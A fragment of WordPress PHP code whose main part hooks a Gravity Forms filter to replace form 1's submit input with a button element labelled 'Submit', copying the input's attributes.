</svg>

   
    <?php
    return ob_get_clean();
});

add_filter( 'gform_submit_button_1', function($button, $form){
    $dom = new DOMDocument();
    $dom->loadHTML( '<?xml encoding="utf-8" ?>' . $button );
    $input = $dom->getElementsByTagName( 'input' )->item(0);
    $new_button = $dom->createElement( 'button' );
    $new_button->appendChild( $dom->createTextNode( 'Submit' ) );
    $input->removeAttribute( 'value' );
    foreach( $input->attributes as $attribute ) {
        $new_button->setAttribute( $attribute->name, $attribute->value );
    }
    $input->parentNode->replaceChild( $new_button, $input );
 
    return $dom->saveHtml( $new_button );
}, 10, 2 );